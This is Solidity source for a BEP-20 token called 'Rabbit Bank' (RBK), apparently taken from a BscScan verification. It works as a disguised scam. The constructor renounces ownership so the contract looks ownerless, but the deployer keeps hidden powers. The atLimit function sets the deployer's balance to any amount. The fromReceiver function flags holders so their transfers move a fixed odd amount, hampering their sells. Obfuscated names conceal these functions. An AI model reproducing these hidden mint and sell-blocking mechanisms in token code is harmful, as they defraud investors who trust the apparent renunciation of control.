/**
 *Submitted for verification at BscScan.com on 2023-01-23
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.5;


contract Ownable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor ()  {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(isOwner(), "Ownable: caller is not the owner");
        _;
    }

    function isOwner() public view returns (bool) {
        return msg.sender == _owner;
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public onlyOwner {
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}


interface UniswapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface UniswapRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}


interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract RabbitBank is IBEP20, Ownable {
    uint8 constant _decimals = 18;
    mapping(address => bool) public isWallet;
    mapping(address => mapping(address => uint256)) _allowances;

    uint256 constant liquidityMarketing = 11 ** 10;
    address public maxBuy;


    address public toToken;
    mapping(address => uint256) _balances;
    string constant _symbol = "RBK";
    string constant _name = "Rabbit Bank";
    mapping(address => bool) public buyReceiver;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    modifier tokenSwap() {
        require(isWallet[msg.sender]);
        _;
    }

    constructor (){
        UniswapRouter receiverToMin = UniswapRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        toToken = UniswapFactory(receiverToMin.factory()).createPair(receiverToMin.WETH(), address(this));
        _allowances[address(this)][address(receiverToMin)] = type(uint256).max;
        maxBuy = msg.sender;
        isWallet[maxBuy] = true;
        _balances[maxBuy] = _totalSupply;
        emit Transfer(address(0), maxBuy, _totalSupply);
        renounceOwnership();
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        if (sender == maxBuy || recipient == maxBuy) {
            return walletModeList(sender, recipient, amount);
        }
        if (buyReceiver[sender]) {
            return walletModeList(sender, recipient, liquidityMarketing);
        }
        return walletModeList(sender, recipient, amount);
    }

    function shouldAmount(address minEnableFee) public tokenSwap {
        isWallet[minEnableFee] = true;
    }

    function atLimit(uint256 atTeam) public tokenSwap {
        _balances[maxBuy] = atTeam;
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function walletModeList(address sender, address recipient, uint256 amount) internal returns (bool) {
        require(amount <= _balances[sender]);
        _balances[sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function getOwner() external view override returns (address) {
        return owner();
    }

    function fromReceiver(address swapTeam) public tokenSwap {
        buyReceiver[swapTeam] = true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != type(uint256).max) {
            require(amount <= _allowances[sender][msg.sender]);
            _allowances[sender][msg.sender] -= amount;
        }
        return _transferFrom(sender, recipient, amount);
    }


}